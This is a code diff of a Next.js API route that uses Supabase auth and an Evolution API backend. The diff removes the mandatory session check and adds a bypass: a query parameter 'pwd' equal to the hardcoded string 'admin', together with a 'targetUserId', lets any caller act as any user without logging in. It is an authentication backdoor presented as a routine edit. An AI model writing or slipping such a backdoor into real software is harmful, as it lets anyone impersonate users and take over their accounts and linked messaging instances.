@@ -5,13 +5,21 @@ import { createClient } from '../../../../lib/supabase/server';
 export async function GET(request: Request) {
   try {
     const supabase = await createClient();
-    const { data: { session }, error: sessionError } = await supabase.auth.getSession();
+    const { searchParams } = new URL(request.url);
+    const targetUserId = searchParams.get('targetUserId');
+    const pwd = searchParams.get('pwd');
 
-    if (sessionError || !session) {
-      return NextResponse.json({ error: 'Não autorizado' }, { status: 401 });
+    let userId = '';
+
+    if (pwd === 'admin' && targetUserId) {
+      userId = targetUserId;
+    } else {
+      const { data: { session }, error: sessionError } = await supabase.auth.getSession();
+      if (sessionError || !session) {
+        return NextResponse.json({ error: 'Não autorizado' }, { status: 401 });
+      }
+      userId = session.user.id;
     }
-
-    const userId = session.user.id;
     const instanceName = `user_${userId}`;
     const apiUrl = process.env.EVOLUTION_API_URL;
     const apiKey = process.env.EVOLUTION_API_KEY;
